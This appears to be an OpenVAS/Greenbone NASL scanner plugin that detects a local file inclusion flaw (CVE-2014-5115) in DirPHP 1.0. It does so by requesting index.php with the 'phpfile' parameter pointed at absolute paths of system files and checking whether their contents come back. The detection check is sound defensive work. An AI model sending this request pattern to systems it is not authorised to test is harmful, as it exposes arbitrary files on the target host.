if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804738" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2014-5115" );
	script_bugtraq_id( 68943 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-08-11 19:18:06 +0530 (Mon, 11 Aug 2014)" );
	script_name( "DirPHP 'path/index.php' Local File Include Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with DirPHP and is prone to local file inclusion
  vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to read
  local file or not." );
	script_tag( name: "insight", value: "Flaw is due to the index.php script not properly sanitizing user input,
  specifically absolute paths supplied via the 'phpfile' parameter." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to read arbitrary files
  on the target system." );
	script_tag( name: "affected", value: "DirPHP version 1.0" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/34173" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/127642" );
	script_xref( name: "URL", value: "http://bot24.blogspot.in/2014/07/dirphp-10-lfi-vulnerability.html" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/", "/phpdir", "/resources", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/index.php" ), port: http_port );
	if(ContainsString( rcvRes, ">DirPHP" ) && ContainsString( rcvRes, "Created & Maintained by Stuart Montgomery<" )){
		for file in keys( files ) {
			url = dir + "/index.php?phpfile=/" + files[file];
			if(http_vuln_check( port: http_port, url: url, pattern: file )){
				report = http_report_vuln_url( port: http_port, url: url );
				security_message( port: http_port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

